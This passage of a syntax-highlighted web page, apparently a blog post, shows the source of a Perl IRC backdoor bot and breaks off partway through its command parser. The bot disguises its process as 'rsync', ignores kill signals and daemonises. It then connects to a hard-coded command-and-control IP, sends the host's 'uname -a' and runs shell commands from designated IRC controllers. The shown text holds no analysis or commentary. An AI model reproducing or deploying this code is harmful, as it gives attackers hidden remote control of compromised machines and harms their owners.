class=\"line\">719</span><br><span class=\"line\">720</span><br><span class=\"line\">721</span><br><span class=\"line\">722</span><br><span class=\"line\">723</span><br><span class=\"line\">724</span><br><span class=\"line\">725</span><br><span class=\"line\">726</span><br><span class=\"line\">727</span><br><span class=\"line\">728</span><br><span class=\"line\">729</span><br><span class=\"line\">730</span><br><span class=\"line\">731</span><br><span class=\"line\">732</span><br><span class=\"line\">733</span><br><span class=\"line\">734</span><br><span class=\"line\">735</span><br><span class=\"line\">736</span><br><span class=\"line\">737</span><br><span class=\"line\">738</span><br><span class=\"line\">739</span><br><span class=\"line\">740</span><br><span class=\"line\">741</span><br><span class=\"line\">742</span><br><span class=\"line\">743</span><br><span class=\"line\">744</span><br><span class=\"line\">745</span><br><span class=\"line\">746</span><br><span class=\"line\">747</span><br><span class=\"line\">748</span><br><span class=\"line\">749</span><br><span class=\"line\">750</span><br><span class=\"line\">751</span><br><span class=\"line\">752</span><br><span class=\"line\">753</span><br><span class=\"line\">754</span><br><span class=\"line\">755</span><br><span class=\"line\">756</span><br><span class=\"line\">757</span><br><span class=\"line\">758</span><br><span class=\"line\">759</span><br><span class=\"line\">760</span><br><span class=\"line\">761</span><br><span class=\"line\">762</span><br><span class=\"line\">763</span><br><span class=\"line\">764</span><br><span class=\"line\">765</span><br><span class=\"line\">766</span><br><span class=\"line\">767</span><br><span class=\"line\">768</span><br><span class=\"line\">769</span><br><span class=\"line\">770</span><br><span class=\"line\">771</span><br><span class=\"line\">772</span><br><span class=\"line\">773</span><br><span class=\"line\">774</span><br><span class=\"line\">775</span><br><span class=\"line\">776</span><br><span class=\"line\">777</span><br><span class=\"line\">778</span><br><span class=\"line\">779</span><br><span class=\"line\">780</span><br><span class=\"line\">781</span><br><span class=\"line\">782</span><br><span class=\"line\">783</span><br><span class=\"line\">784</span><br><span class=\"line\">785</span><br><span class=\"line\">786</span><br><span class=\"line\">787</span><br><span class=\"line\">788</span><br><span class=\"line\">789</span><br><span class=\"line\">790</span><br><span class=\"line\">791</span><br><span class=\"line\">792</span><br><span class=\"line\">793</span><br><span class=\"line\">794</span><br><span class=\"line\">795</span><br><span class=\"line\">796</span><br><span class=\"line\">797</span><br><span class=\"line\">798</span><br><span class=\"line\">799</span><br><span class=\"line\">800</span><br><span class=\"line\">801</span><br><span class=\"line\">802</span><br><span class=\"line\">803</span><br><span class=\"line\">804</span><br><span class=\"line\">805</span><br><span class=\"line\">806</span><br><span class=\"line\">807</span><br><span class=\"line\">808</span><br><span class=\"line\">809</span><br><span class=\"line\">810</span><br><span class=\"line\">811</span><br><span class=\"line\">812</span><br><span class=\"line\">813</span><br><span class=\"line\">814</span><br><span class=\"line\">815</span><br><span class=\"line\">816</span><br><span class=\"line\">817</span><br><span class=\"line\">818</span><br><span class=\"line\">819</span><br><span class=\"line\">820</span><br><span class=\"line\">821</span><br><span class=\"line\">822</span><br><span class=\"line\">823</span><br><span class=\"line\">824</span><br><span class=\"line\">825</span><br><span class=\"line\">826</span><br><span class=\"line\">827</span><br><span class=\"line\">828</span><br><span class=\"line\">829</span><br><span class=\"line\">830</span><br><span class=\"line\">831</span><br><span class=\"line\">832</span><br><span class=\"line\">833</span><br><span class=\"line\">834</span><br><span class=\"line\">835</span><br><span class=\"line\">836</span><br><span class=\"line\">837</span><br><span class=\"line\">838</span><br><span class=\"line\">839</span><br><span class=\"line\">840</span><br><span class=\"line\">841</span><br><span class=\"line\">842</span><br><span class=\"line\">843</span><br><span class=\"line\">844</span><br><span class=\"line\">845</span><br><span class=\"line\">846</span><br><span class=\"line\">847</span><br><span class=\"line\">848</span><br><span class=\"line\">849</span><br><span class=\"line\">850</span><br><span class=\"line\">851</span><br><span class=\"line\">852</span><br><span class=\"line\">853</span><br><span class=\"line\">854</span><br><span class=\"line\">855</span><br><span class=\"line\">856</span><br><span class=\"line\">857</span><br><span class=\"line\">858</span><br><span class=\"line\">859</span><br><span class=\"line\">860</span><br><span class=\"line\">861</span><br><span class=\"line\">862</span><br><span class=\"line\">863</span><br><span class=\"line\">864</span><br><span class=\"line\">865</span><br><span class=\"line\">866</span><br><span class=\"line\">867</span><br><span class=\"line\">868</span><br><span class=\"line\">869</span><br><span class=\"line\">870</span><br><span class=\"line\">871</span><br><span class=\"line\">872</span><br><span class=\"line\">873</span><br><span class=\"line\">874</span><br><span class=\"line\">875</span><br><span class=\"line\">876</span><br><span class=\"line\">877</span><br><span class=\"line\">878</span><br><span class=\"line\">879</span><br><span class=\"line\">880</span><br><span class=\"line\">881</span><br><span class=\"line\">882</span><br><span class=\"line\">883</span><br><span class=\"line\">884</span><br><span class=\"line\">885</span><br><span class=\"line\">886</span><br><span class=\"line\">887</span><br><span class=\"line\">888</span><br><span class=\"line\">889</span><br><span class=\"line\">890</span><br><span class=\"line\">891</span><br><span class=\"line\">892</span><br><span class=\"line\">893</span><br><span class=\"line\">894</span><br><span class=\"line\">895</span><br><span class=\"line\">896</span><br><span class=\"line\">897</span><br><span class=\"line\">898</span><br><span class=\"line\">899</span><br><span class=\"line\">900</span><br><span class=\"line\">901</span><br><span class=\"line\">902</span><br><span class=\"line\">903</span><br><span class=\"line\">904</span><br><span class=\"line\">905</span><br><span class=\"line\">906</span><br><span class=\"line\">907</span><br><span class=\"line\">908</span><br><span class=\"line\">909</span><br><span class=\"line\">910</span><br><span class=\"line\">911</span><br><span class=\"line\">912</span><br><span class=\"line\">913</span><br><span class=\"line\">914</span><br><span class=\"line\">915</span><br><span class=\"line\">916</span><br><span class=\"line\">917</span><br><span class=\"line\">918</span><br><span class=\"line\">919</span><br><span class=\"line\">920</span><br><span class=\"line\">921</span><br><span class=\"line\">922</span><br><span class=\"line\">923</span><br><span class=\"line\">924</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $processo = <span class=\"string\">&#x27;rsync&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$servidor=<span class=\"string\">&#x27;5.255.86.129&#x27;</span> <span class=\"keyword\">unless</span> $servidor;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $porta=<span class=\"string\">&#x27;443&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> @canais=(<span class=\"string\">&quot;#007&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">my</span> @adms=(<span class=\"string\">&quot;A&quot;</span>,<span class=\"string\">&quot;X&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">my</span> @auth=(<span class=\"string\">&quot;localhost&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $linas_max=<span class=\"number\">6</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $sleep=<span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $nick = getnick();</span><br><span class=\"line\"><span class=\"keyword\">my</span> $ircname = getnick();</span><br><span class=\"line\"><span class=\"keyword\">my</span> $realname = (<span class=\"string\">`uname -a`</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $acessoshell = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $prefixo = <span class=\"string\">&quot;! &quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $estatisticas = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $pacotes = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $VERSAO = <span class=\"string\">&#x27;0.2a&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;INT&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;HUP&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;TERM&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;CHLD&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;PS&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> IO::Socket;</span><br><span class=\"line\"><span class=\"keyword\">use</span> Socket;</span><br><span class=\"line\"><span class=\"keyword\">use</span> IO::Select;</span><br><span class=\"line\"><span class=\"keyword\">chdir</span>(<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">$servidor=<span class=\"string\">&quot;$ARGV[0]&quot;</span> <span class=\"keyword\">if</span> $ARGV[<span class=\"number\">0</span>];</span><br><span class=\"line\">$0=<span class=\"string\">&quot;$processo&quot;</span>.<span class=\"string\">&quot;\\0&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $pid=<span class=\"keyword\">fork</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span> <span class=\"keyword\">if</span> $pid;</span><br><span class=\"line\"><span class=\"keyword\">die</span> <span class=\"string\">&quot;Problema com o fork: $!&quot;</span> <span class=\"keyword\">unless</span> <span class=\"keyword\">defined</span>($pid);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> %irc_servers;</span><br><span class=\"line\"><span class=\"keyword\">my</span> %DCC;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $dcc_sel = new IO::Select-&gt;new();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getnick</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">&quot;x&quot;</span>.int(<span class=\"keyword\">rand</span>(<span class=\"number\">9000</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getident</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $retornoident = &amp;_get(<span class=\"string\">&quot;http://www.minpop.com/sk12pack/idents.php&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $identchance = <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span>(<span class=\"number\">1000</span>));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($identchance &gt; <span class=\"number\">30</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span> $nick;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span> $retornoident;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $retornoident;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getname</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $retornoname = &amp;_get(<span class=\"string\">&quot;http://www.minpop.com/sk12pack/names.php&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $retornoname;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getident2</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">my</span> $length=<span class=\"keyword\">shift</span>;</span><br><span class=\"line\">        $length = <span class=\"number\">3</span> <span class=\"keyword\">if</span> ($length &lt; <span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">my</span> @chars=(<span class=\"string\">&#x27;a&#x27;</span>..<span class=\"string\">&#x27;z&#x27;</span>,<span class=\"string\">&#x27;A&#x27;</span>..<span class=\"string\">&#x27;Z&#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>..<span class=\"string\">&#x27;9&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"number\">1</span>..$length)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                $randomstring.=$chars[<span class=\"keyword\">rand</span> @chars];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $randomstring;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getstore</span> ($$)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $url = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $file = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  $http_stream_out = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">open</span>(GET_OUTFILE, <span class=\"string\">&quot;&gt; $file&quot;</span>);</span><br><span class=\"line\">  %http_loop_check = ();</span><br><span class=\"line\">  _get($url);</span><br><span class=\"line\">  <span class=\"keyword\">close</span> GET_OUTFILE;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $main::http_get_result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> _<span class=\"title\">get</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $url = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $proxy = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">grep</span> &#123;(<span class=\"keyword\">lc</span>($_) eq <span class=\"string\">&quot;http_proxy&quot;</span>) &amp;&amp; ($proxy = $ENV&#123;$_&#125;)&#125; <span class=\"keyword\">keys</span> %ENV;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (($proxy eq <span class=\"string\">&quot;&quot;</span>) &amp;&amp; $url =~ m,^http:<span class=\"regexp\">//</span>([^<span class=\"regexp\">/:]+)(?::(\\d+))?(/</span>\\S*)?$,) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $host = $1;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $port = $2 || <span class=\"number\">80</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $path = $3;</span><br><span class=\"line\">    $path = <span class=\"string\">&quot;/&quot;</span> <span class=\"keyword\">unless</span> <span class=\"keyword\">defined</span>($path);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _trivial_http_get($host, $port, $path);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">elsif</span> ($proxy =~ m,^http:<span class=\"regexp\">//</span>([^<span class=\"regexp\">/:]+):(\\d+)(/</span>\\S*)?$,) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $host = $1;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $port = $2;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $path = $url;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _trivial_http_get($host, $port, $path);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">undef</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> _<span class=\"title\">trivial_http_get</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span>($host, $port, $path) = @_;</span><br><span class=\"line\">  <span class=\"keyword\">my</span>($AGENT, $VERSION, $p);</span><br><span class=\"line\"></span><br><span class=\"line\">  $AGENT = <span class=\"string\">&quot;get-minimal&quot;</span>;</span><br><span class=\"line\">  $VERSION = <span class=\"string\">&quot;20000118&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  $path =~ <span class=\"regexp\">s/ /%20/g</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">require</span> IO::Socket;</span><br><span class=\"line\">  <span class=\"keyword\">local</span>($^W) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $sock = IO::Socket::INET-&gt;new(<span class=\"string\">PeerAddr =&gt;</span> $host,</span><br><span class=\"line\">                                   <span class=\"string\">PeerPort =&gt;</span> $port,</span><br><span class=\"line\">                                   <span class=\"string\">Proto   =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>,</span><br><span class=\"line\">                                   <span class=\"string\">Timeout  =&gt;</span> <span class=\"number\">60</span>) || <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  $sock-&gt;autoflush;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $netloc = $host;</span><br><span class=\"line\">  $netloc .= <span class=\"string\">&quot;:$port&quot;</span> <span class=\"keyword\">if</span> $port != <span class=\"number\">80</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $request = <span class=\"string\">&quot;GET $path HTTP/1.0\\015\\012&quot;</span></span><br><span class=\"line\">              . <span class=\"string\">&quot;Host: $netloc\\015\\012&quot;</span></span><br><span class=\"line\">              . <span class=\"string\">&quot;User-Agent: $AGENT/$VERSION/u\\015\\012&quot;</span>;</span><br><span class=\"line\">  $request .= <span class=\"string\">&quot;Pragma: no-cache\\015\\012&quot;</span> <span class=\"keyword\">if</span> ($main::http_no_cache);</span><br><span class=\"line\">  $request .= <span class=\"string\">&quot;\\015\\012&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">print</span> $sock $request;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> $buf = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $n;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $b1 = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ($n = <span class=\"keyword\">sysread</span>($sock, $buf, <span class=\"number\">8</span>*<span class=\"number\">1024</span>, <span class=\"keyword\">length</span>($buf))) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($b1 eq <span class=\"string\">&quot;&quot;</span>) &#123; </span><br><span class=\"line\">      $b1 = $buf;         </span><br><span class=\"line\">      $buf =~ <span class=\"regexp\">s/.+?\\015?\\012\\015?\\012//s</span>;      </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($http_stream_out) &#123; <span class=\"keyword\">print</span> GET_OUTFILE $buf; $buf = <span class=\"string\">&quot;&quot;</span>; &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">undef</span> <span class=\"keyword\">unless</span> <span class=\"keyword\">defined</span>($n);</span><br><span class=\"line\"></span><br><span class=\"line\">  $main::http_get_result = <span class=\"number\">200</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($b1 =~ m,^HTTP/\\d+\\.\\d+\\s+(\\d+)[^\\<span class=\"number\">012</span>]*\\<span class=\"number\">012</span>,) &#123;</span><br><span class=\"line\">    $main::http_get_result = $1;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($main::http_get_result =~ <span class=\"regexp\">/^30[1237]/</span> &amp;&amp; $b1 =~ <span class=\"regexp\">/\\012Location:\\s*(\\S+)/</span></span><br><span class=\"line\">) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">my</span> $url = $1;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">undef</span> <span class=\"keyword\">if</span> $http_loop_check&#123;$url&#125;++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> _get($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">undef</span> <span class=\"keyword\">unless</span> $main::http_get_result =~ <span class=\"regexp\">/^2/</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> $buf;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$sel_cliente = IO::Select-&gt;new();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">sendraw</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($#_ == <span class=\"string\">&#x27;1&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $socket = $_[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">print</span> $socket <span class=\"string\">&quot;$_[1]\\n&quot;</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">print</span> $IRC_cur_socket <span class=\"string\">&quot;$_[0]\\n&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">conectar</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">my</span> $meunick = $_[<span class=\"number\">0</span>];</span><br><span class=\"line\">   <span class=\"keyword\">my</span> $servidor_con = $_[<span class=\"number\">1</span>];</span><br><span class=\"line\">   <span class=\"keyword\">my</span> $porta_con = $_[<span class=\"number\">2</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">my</span> $IRC_socket = IO::Socket::INET-&gt;new(<span class=\"string\">Proto=&gt;</span><span class=\"string\">&quot;tcp&quot;</span>, <span class=\"string\">PeerAddr=&gt;</span><span class=\"string\">&quot;$servidor_con&quot;</span>, <span class=\"string\">PeerPort=&gt;$porta_con</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">return</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (<span class=\"keyword\">defined</span>($IRC_socket)) &#123;</span><br><span class=\"line\">     $IRC_cur_socket = $IRC_socket;</span><br><span class=\"line\"></span><br><span class=\"line\">     $IRC_socket-&gt;autoflush(<span class=\"number\">1</span>);</span><br><span class=\"line\">     $sel_cliente-&gt;add($IRC_socket);</span><br><span class=\"line\"></span><br><span class=\"line\">     $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;host&#x27;</span>&#125; = <span class=\"string\">&quot;$servidor_con&quot;</span>;</span><br><span class=\"line\">     $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;porta&#x27;</span>&#125; = <span class=\"string\">&quot;$porta_con&quot;</span>;</span><br><span class=\"line\">     $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nick&#x27;</span>&#125; = $meunick;</span><br><span class=\"line\">     $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;meuip&#x27;</span>&#125; = $IRC_socket-&gt;sockhost;</span><br><span class=\"line\">     nick(<span class=\"string\">&quot;$meunick&quot;</span>);</span><br><span class=\"line\">     sendraw(<span class=\"string\">&quot;USER $ircname &quot;</span>.$IRC_socket-&gt;sockhost.<span class=\"string\">&quot; $servidor_con :$realname&quot;</span>);</span><br><span class=\"line\">     <span class=\"keyword\">sleep</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $line_temp;</span><br><span class=\"line\"><span class=\"keyword\">while</span>( <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">   <span class=\"keyword\">while</span> (!(<span class=\"keyword\">keys</span>(%irc_servers))) &#123; conectar(<span class=\"string\">&quot;$nick&quot;</span>, <span class=\"string\">&quot;$servidor&quot;</span>, <span class=\"string\">&quot;$porta&quot;</span>); &#125;</span><br><span class=\"line\">   <span class=\"keyword\">delete</span>($irc_servers&#123;<span class=\"string\">&#x27;&#x27;</span>&#125;) <span class=\"keyword\">if</span> (<span class=\"keyword\">defined</span>($irc_servers&#123;<span class=\"string\">&#x27;&#x27;</span>&#125;));</span><br><span class=\"line\">   &amp;DCC::connections;</span><br><span class=\"line\">   <span class=\"keyword\">my</span> @ready = $sel_cliente-&gt;can_read(<span class=\"number\">0</span>.<span class=\"number\">6</span>);</span><br><span class=\"line\">   <span class=\"keyword\">next</span> <span class=\"keyword\">unless</span>(@ready);</span><br><span class=\"line\">   <span class=\"keyword\">foreach</span> $fh (@ready) &#123;</span><br><span class=\"line\">     $IRC_cur_socket = $fh;</span><br><span class=\"line\">     $meunick = $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nick&#x27;</span>&#125;;</span><br><span class=\"line\">     $nread = <span class=\"keyword\">sysread</span>($fh, $msg, <span class=\"number\">4096</span>);</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($nread == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        $sel_cliente-&gt;remove($fh);</span><br><span class=\"line\">        $fh-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">        <span class=\"keyword\">delete</span>($irc_servers&#123;$fh&#125;);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     @lines = <span class=\"keyword\">split</span> (<span class=\"regexp\">/\\n/</span>, $msg);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">for</span>(<span class=\"keyword\">my</span> $c=<span class=\"number\">0</span>; $c&lt;= $#lines; $c++) &#123;</span><br><span class=\"line\">       $line = $lines[$c];</span><br><span class=\"line\">       $line=$line_temp.$line <span class=\"keyword\">if</span> ($line_temp);</span><br><span class=\"line\">       $line_temp=<span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">       $line =~ <span class=\"regexp\">s/\\r$//</span>;</span><br><span class=\"line\">       <span class=\"keyword\">unless</span> ($c == $#lines) &#123;</span><br><span class=\"line\">         parse(<span class=\"string\">&quot;$line&quot;</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span> ($#lines == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">             parse(<span class=\"string\">&quot;$line&quot;</span>);</span><br><span class=\"line\">           &#125; <span class=\"keyword\">elsif</span> ($lines[$c] =~ <span class=\"regexp\">/\\r$/</span>) &#123;</span><br><span class=\"line\">               parse(<span class=\"string\">&quot;$line&quot;</span>);</span><br><span class=\"line\">           &#125; <span class=\"keyword\">elsif</span> ($line =~ <span class=\"regexp\">/^(\\S+) NOTICE AUTH :\\*\\*\\*/</span>) &#123;</span><br><span class=\"line\">               parse(<span class=\"string\">&quot;$line&quot;</span>);</span><br><span class=\"line\">           &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">               $line_temp = $line;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">parse</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">my</span> $servarg = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> ($servarg =~ <span class=\"regexp\">/^PING \\:(.*)/</span>) &#123;</span><br><span class=\"line\">     sendraw(<span class=\"string\">&quot;PONG :$1&quot;</span>);</span><br><span class=\"line\">   &#125; <span class=\"keyword\">elsif</span> ($servarg =~ <span class=\"regexp\">/^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/</span>) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">my</span> $pn=$1; <span class=\"keyword\">my</span> $onde = $4; <span class=\"keyword\">my</span> $args = $5;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ($args =~ <span class=\"regexp\">/^\\001VERSION\\001$/</span>) &#123;</span><br><span class=\"line\">         notice(<span class=\"string\">&quot;$pn&quot;</span>, <span class=\"string\">&quot;\\001VERSION mIRC v6.16 ENE ALIN GABRIEL\\001&quot;</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">elsif</span> ($args =~ <span class=\"regexp\">/^\\001PING\\s+(\\d+)\\001$/</span>) &#123;</span><br><span class=\"line\">         notice(<span class=\"string\">&quot;$pn&quot;</span>, <span class=\"string\">&quot;\\001PONG\\001&quot;</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">elsif</span> (<span class=\"keyword\">grep</span> &#123;$_ =~ <span class=\"regexp\">/^\\Q$pn\\E$/i</span> &#125; @adms) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">if</span> ($onde eq <span class=\"string\">&quot;$meunick&quot;</span>)&#123;</span><br><span class=\"line\">           shell(<span class=\"string\">&quot;$pn&quot;</span>, <span class=\"string\">&quot;$args&quot;</span>);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">         <span class=\"keyword\">elsif</span> ($args =~ <span class=\"regexp\">/^(\\Q$meunick\\E|\\Q$prefixo\\E)\\s+(.*)/</span> ) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">my</span> $natrix = $1;</span><br><span class=\"line\">            <span class=\"keyword\">my</span> $arg = $2;</span><br><span 